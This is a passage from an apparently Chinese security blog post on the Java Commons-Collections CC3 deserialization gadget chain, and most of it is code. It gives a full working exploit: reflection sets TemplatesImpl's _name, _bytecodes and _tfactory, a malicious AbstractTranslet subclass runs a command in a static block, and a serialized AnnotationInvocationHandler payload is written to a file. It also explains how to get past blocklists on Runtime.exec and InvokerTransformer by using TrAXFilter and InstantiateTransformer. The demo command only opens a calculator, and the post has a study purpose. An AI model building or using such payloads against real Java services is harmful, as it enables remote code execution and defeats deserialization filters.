class_">ErrorMsg</span>(ErrorMsg.NO_TRANSLET_CLASS_ERR);<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerConfigurationException</span>(err.toString());<br>        &#125;<br><br>        <span class="hljs-type">TransletClassLoader</span> <span class="hljs-variable">loader</span> <span class="hljs-operator">=</span> (TransletClassLoader)<br>            AccessController.doPrivileged(<span class="hljs-keyword">new</span> <span class="hljs-title class_">PrivilegedAction</span>() &#123;<br>                <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransletClassLoader</span>(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());   <span class="hljs-comment">//_tfactory需要赋值，如果不赋值，这条语句会报错，代码会停止执行。</span><br>                &#125;<br>            &#125;);<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">classCount</span> <span class="hljs-operator">=</span> _bytecodes.length;<br>            _class = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[classCount];<br><br>            <span class="hljs-keyword">if</span> (classCount &gt; <span class="hljs-number">1</span>) &#123;<br>                _auxClasses = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>            &#125;<br><br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; classCount; i++) &#123;<br>                _class[i] = loader.defineClass(_bytecodes[i]);          <span class="hljs-comment">//这里的_bytecodes是defineClass的参数，是我们需要代码执行的地方。</span><br>                <span class="hljs-keyword">final</span> <span class="hljs-type">Class</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> _class[i].getSuperclass();<br><br>                <span class="hljs-comment">// Check if this is the main class</span><br>                <span class="hljs-keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;<br>                    _transletIndex = i;<br>                &#125;<br>                <span class="hljs-keyword">else</span> &#123;<br>                    _auxClasses.put(_class[i].getName(), _class[i]);<br>                &#125;<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (_transletIndex &lt; <span class="hljs-number">0</span>) &#123;<br>                ErrorMsg err= <span class="hljs-keyword">new</span> <span class="hljs-title class_">ErrorMsg</span>(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerConfigurationException</span>(err.toString());<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (ClassFormatError e) &#123;<br>            <span class="hljs-type">ErrorMsg</span> <span class="hljs-variable">err</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ErrorMsg</span>(ErrorMsg.TRANSLET_CLASS_ERR, _name);<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerConfigurationException</span>(err.toString());<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (LinkageError e) &#123;<br>            <span class="hljs-type">ErrorMsg</span> <span class="hljs-variable">err</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ErrorMsg</span>(ErrorMsg.TRANSLET_OBJECT_ERR, _name);<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerConfigurationException</span>(err.toString());<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>所以我们一共有三个需要赋值的地方：_name、_bytecodes、_tfactory</p><hr style="border: 1px solid black;"/><p>可以序列化的类，反射直接修改就行。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> templates.getClass();<br><span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>nameField.setAccessible(<span class="hljs-literal">true</span>);<br>nameField.set(templates,<span class="hljs-string">&quot;aaa&quot;</span>);<br></code></pre></td></tr></table></figure><p>修改_bytecodes属性的时候要注意，它的值应该是我们需要执行的代码。它是一个二维数组</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-type">byte</span>[][] _bytecodes = <span class="hljs-literal">null</span>;<br></code></pre></td></tr></table></figure><p>我们来看defineClass接受的参数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">Class <span class="hljs-title function_">defineClass</span><span class="hljs-params">(<span class="hljs-keyword">final</span> <span class="hljs-type">byte</span>[] b)</span> &#123;<br>    <span class="hljs-keyword">return</span> defineClass(<span class="hljs-literal">null</span>, b, <span class="hljs-number">0</span>, b.length);<br>&#125;<br></code></pre></td></tr></table></figure><p>它接收的是一个一维的_bytecodes数组，那么我们可以这样修改：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;/home/yinyun/Documents/JavaLearing/CC/target/classes/runtime.class&quot;</span>));   <span class="hljs-comment">//构建一维byte数组，为了适应defineClass接收的参数，并从文件里读byte</span><br><span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;  <span class="hljs-comment">//把一维byte数组变成二维的交给_bytecodes</span><br><span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br>bytecodesField.set(templates,codes);<br></code></pre></td></tr></table></figure><hr style="border: 1px solid black;"/><p>难点就在最后一个变量</p><p>_tfactory的赋值。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">transient</span> <span class="hljs-type">TransformerFactoryImpl</span> <span class="hljs-variable">_tfactory</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br></code></pre></td></tr></table></figure><p>这个变量有一个修饰符叫transient，代表着这个属性是不能被序列化的，意思是反序列化不能给它赋值。</p><p>那我们只能通过readObject给它赋值了，我们看一下本类的readObject：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span>  <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream is)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;<br>    …………<br>_tfactory = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>();<br>&#125;<br></code></pre></td></tr></table></figure><hr style="border: 1px solid black;"/><p>到此，我们首先正着写一下代码，看看我们的链子成没成功：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC3</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();    <span class="hljs-comment">//TemplatesImpl类可以序列化，直接new</span><br><br>        <span class="hljs-comment">//反射修改类的属性_name</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates,<span class="hljs-string">&quot;aaa&quot;</span>);<br><br>        <span class="hljs-comment">//反射修改类的属性_bytecodes</span><br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;/home/yinyun/Documents/JavaLearing/CC/target/classes/runtime.class&quot;</span>));   <span class="hljs-comment">//构建一维byte数组，为了适应defineClass接收的参数，并从文件里读byte</span><br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;  <span class="hljs-comment">//把一维byte数组变成二维的交给_bytecodes</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br>        bytecodesField.set(templates,codes);<br><br>        <span class="hljs-comment">//反射修改类的属性_tfactory</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        templates.newTransformer();     <span class="hljs-comment">//第一步入口方法，newTransformer</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>跑一边发现报错了，报了一个空指针错误。</p><p><img src="/img/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC3%E9%93%BE/image-20240417113212471.png" alt="image-20240417113212471"></p><p>我们调一下到TemplatesImpl类里的422行。</p><p><img src="/img/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC3%E9%93%BE/image-20240417113658160.png" alt="image-20240417113658160"></p><p>这里的if是判断TemplatesImpl类的父类是否是一个常量ABSTRACT_TRANSLET，如果是，就给_transletIndex赋值为i，如果不是，就进else。</p><p>可以看到，我们不满足if条件，进了else，这里的_auxClasses值是空的，所以才会报了空指针错误。</p><p>那么我们现在有两种办法：一是使得if判断成立，给_transletIndex赋值，二是给_auxClasses赋值。</p><p>但是我们看下面还有一个if判断，判断_transletIndex是否小于0，如果我们不给_transletIndex赋值，那它的值默认是-1，就会小于0，进入下面那个if，然后抛出一个Error，代码也就执行不了了。所以这里的方法二是走不通了，我们只能走方法一，给_transletIndex赋值。</p><hr style="border: 1px solid black;"/><p>首先我们需要满足if条件，即我们执行代码的类的父类要是ABSTRACT_TRANSLET，我们进去看一眼这个常量是什么：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">ABSTRACT_TRANSLET</span><br>       <span class="hljs-operator">=</span> <span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>;<br></code></pre></td></tr></table></figure><p>然后我们修改runtime.class类的父类。</p><p>因为AbstractTranslet是抽象类，所以我们要实现它所有的抽象方法。</p><p>这里IDEA很方便，直接一键实现即可。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">runtime</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span>&#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;mate-calc&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>把这个类编译一下。</p><p>然后我们拿着新的runtime.class再来执行一下我们写的链子。</p><p><img src="/img/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC3%E9%93%BE/image-20240417115815640.png" alt="image-20240417115815640"></p><p>成功弹计算器。</p><p>至此，我们的入口newTransformer到出口整条链子就没问题了。然后我们只需要把这个入口Transformer嵌入到CC1链里，就可以序列化反序列化了。</p><h3 id="完整CC3链："><a href="#完整CC3链：" class="headerlink" title="完整CC3链："></a>完整CC3链：</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC3</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();    <span class="hljs-comment">//TemplatesImpl类可以序列化，直接new</span><br><br>        <span class="hljs-comment">//反射修改类的属性_name</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates,<span class="hljs-string">&quot;aaa&quot;</span>);<br><br>        <span class="hljs-comment">//反射修改类的属性_bytecodes</span><br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;/home/yinyun/Documents/JavaLearing/CC/target/classes/runtime.class&quot;</span>));   <span class="hljs-comment">//构建一维byte数组，为了适应defineClass接收的参数，并从文件里读byte</span><br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;  <span class="hljs-comment">//把一维byte数组变成二维的交给_bytecodes</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br>        bytecodesField.set(templates,codes);<br><br>        <span class="hljs-comment">//反射修改类的属性_tfactory</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-comment">//templates.newTransformer();     //第一步入口方法，newTransformer</span><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(templates),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newTransformer&quot;</span>,<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span>  <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        <span class="hljs-comment">//Map类的构建与修饰</span><br>        HashMap&lt;Object,Object&gt; inmap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        inmap.put(<span class="hljs-string">&quot;value&quot;</span>,<span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">outmap</span> <span class="hljs-operator">=</span> TransformedMap.decorate(inmap,<span class="hljs-literal">null</span>,chainedTransformer);<br><br>        <span class="hljs-comment">//遍历map，触发链子</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructorhandler</span> <span class="hljs-operator">=</span> handler.getDeclaredConstructor(Class.class, Map.class);<br>        constructorhandler.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> constructorhandler.newInstance(Target.class,outmap);<br>        serialize(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;serialize&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC3%E9%93%BE/image-20240417120528155.png" alt="image-20240417120528155"></p><p>我们就从CC1的命令执行，进化到了CC3的代码执行，其实整条链子是差不多的，触发方式都是一样的。</p><h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><p>如果不仅过滤了Runtime.exec()也过滤了InvokerTransform呢？</p><p>其实IvokerTransform也就是调用了newTransformer，那么还有没有其它地方能调用newTransformer呢？</p><p>答案是有的，在TrAXFilter类里也调用了，但是这个类是不能序列化的，所以我们只能通过它的构造函数给它传参。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">TrAXFilter</span><span class="hljs-params">(Templates templates)</span>  <span class="hljs-keyword">throws</span> TransformerConfigurationException&#123;   <span class="hljs-comment">//传了一个templates进去</span><br>    _templates = templates;<br>    _transformer = (TransformerImpl) templates.newTransformer();      <span class="hljs-comment">//调用了templates的newTransformer()方法</span><br>    _transformerHandler = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerHandlerImpl</span>(_transformer);<br>    _useServicesMechanism = _transformer.useServicesMechnism();<br>&#125;<br></code></pre></td></tr></table></figure><p>也就是说，如果我们能调用TrAXFilter的构造函数，我们就能成功执行代码。</p><hr style="border: 1px solid black;"/><p>InstantiateTransformer类是初始化Transformer的，就是一个调构造函数的。</p><p>我们看一下它的transform方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">transform</span><span class="hljs-params">(Object input)</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">if</span> (input <span class="hljs-keyword">instanceof</span> Class == <span class="hljs-literal">false</span>) &#123;       <span class="hljs-comment">//判断传进来的是不是一个class，这里需要TrAXFilter.class</span><br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FunctorException</span>(<br>                <span class="hljs-string">&quot;InstantiateTransformer: Input object was not an instanceof Class, it was a &quot;</span><br>                    + (input == <span class="hljs-literal">null</span> ? <span class="hljs-string">&quot;null object&quot;</span> : input.getClass().getName()));<br>        &#125;<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">con</span> <span class="hljs-operator">=</span> ((Class) input).getConstructor(iParamTypes);       <span class="hljs-comment">//调用构造器</span><br>        <span class="hljs-keyword">return</span> con.newInstance(iArgs);<br>        &#125;<br></code></pre></td></tr></table></figure><p>这就完美符合了我们需要调用构造函数传参的条件，</p><p>我们看一下InstantiateTransformer类的构造函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">InstantiateTransformer</span><span class="hljs-params">(Class[] paramTypes, Object[] args)</span> &#123;    <span class="hljs-comment">//需要两个数组</span><br>        <span class="hljs-built_in">super</span>();<br>        iParamTypes = paramTypes;<br>        iArgs = args;<br>    &#125;<br></code></pre></td></tr></table></figure><p>它需要我们准备传入的类的构造方法的参数类型和参数。这里就是TrAXFilter类的构造方法的参数类型和参数。</p><p>可以这样写</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);<br>instantiateTransformer.transform(TrAXFilter.class);   <span class="hljs-comment">//执行代码</span><br></code></pre></td></tr></table></figure><p>总的来说就是可以用一句：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);<br></code></pre></td></tr></table></figure><p>来替换所有的IvokerTransform：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JAVA">Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(templates),<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newTransformer&quot;</span>,<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>)<br>&#125;;<br><span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span>  <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br></code></pre></td></tr></table></figure><p>这里为了传入TrAXFilter.class，我们还是需要用老朋友，ChainedTransformer</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] transformers = <span 